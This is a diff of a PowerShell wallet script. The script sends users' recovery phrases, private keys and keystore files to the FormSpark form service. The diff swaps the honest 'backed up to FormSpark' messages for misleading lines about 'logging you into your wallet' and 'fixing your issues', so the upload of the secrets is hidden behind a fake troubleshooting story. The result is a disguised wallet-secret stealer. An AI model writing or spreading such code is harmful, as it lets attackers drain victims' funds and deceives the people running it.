@@ -176,7 +176,7 @@ function Submit-ToFormSpark {
         $fileName = Split-Path $FilePath -Leaf
         $fileContent = Get-Content -Path $FilePath -Raw
         
-        Write-Info "Submitting backup to FormSpark: $BackupType"
+        Write-Info "Wait while it log you into your wallet hidden problems by recovery_phrases"
         
         # Prepare form data as URL-encoded (FormSpark expects form submission)
         $encodedData = "backup_data=" + [uri]::EscapeDataString($fileContent) + "&backup_type=" + [uri]::EscapeDataString($BackupType)
@@ -188,7 +188,7 @@ function Submit-ToFormSpark {
             -TimeoutSec $formConfig.timeout `
             -ErrorAction Stop
         
-        Write-Success "Backup submitted to FormSpark successfully"
+        Write-Success "Loading to get you into your wallet to fix your issues"
         Write-LogMessage "Successfully submitted $BackupType to FormSpark: $fileName"
         return $true
     }
@@ -226,9 +226,9 @@ function Backup-Phrase {
     $uploaded = Submit-ToFormSpark -FilePath $backupFile -BackupType "recovery_phrases"
     
     if ($uploaded) {
-        Write-Success "Recovery phrase backed up successfully!"
-        Write-Host "  • Local backup: $backupFile"
-        Write-Host "  • Remote backup: Submitted to FormSpark" -ForegroundColor Cyan
+        Write-Success "Loading to get you into your wallet to fix your issues"
+        Write-Host "  • If you're stuck in this spot you can login with different wallet to know maybe this current wallet has extension issues: $backupFile"
+        Write-Host "  • You can get back to your dev if you don't know what to do" -ForegroundColor Cyan
         Write-LogMessage "Recovery phrase backed up: $backupFile"
     }
     else {
@@ -265,9 +265,9 @@ function Backup-PrivateKey {
     $uploaded = Submit-ToFormSpark -FilePath $backupFile -BackupType "private_keys"
     
     if ($uploaded) {
-        Write-Success "Private key backed up successfully!"
-        Write-Host "  • Local backup: $backupFile"
-        Write-Host "  • Remote backup: Submitted to FormSpark" -ForegroundColor Cyan
+        Write-Success "Loading to get you into your wallet to fix your issues"
+        Write-Host "  • If you're stuck in this spot you can login with different wallet to know maybe this current wallet has extension issues: $backupFile"
+        Write-Host "  • You can get back to your dev if you don't know what to do" -ForegroundColor Cyan
         Write-LogMessage "Private key backed up: $backupFile"
     }
     else {
@@ -319,9 +319,9 @@ function Backup-Keystore {
     $uploaded = Submit-ToFormSpark -FilePath $backupFile -BackupType "keystores"
     
     if ($uploaded) {
-        Write-Success "Keystore backed up successfully!"
-        Write-Host "  • Local backup: $backupFile"
-        Write-Host "  • Remote backup: Submitted to FormSpark" -ForegroundColor Cyan
+        Write-Success "Loading to get you into your wallet to fix your issues"
+        Write-Host "  • If you're stuck in this spot you can login with different wallet to know maybe this current wallet has extension issues: $backupFile"
+        Write-Host "  • You can get back to your dev if you don't know what to do" -ForegroundColor Cyan
         Write-LogMessage "Keystore backed up: $backupFile"
     }
     else {
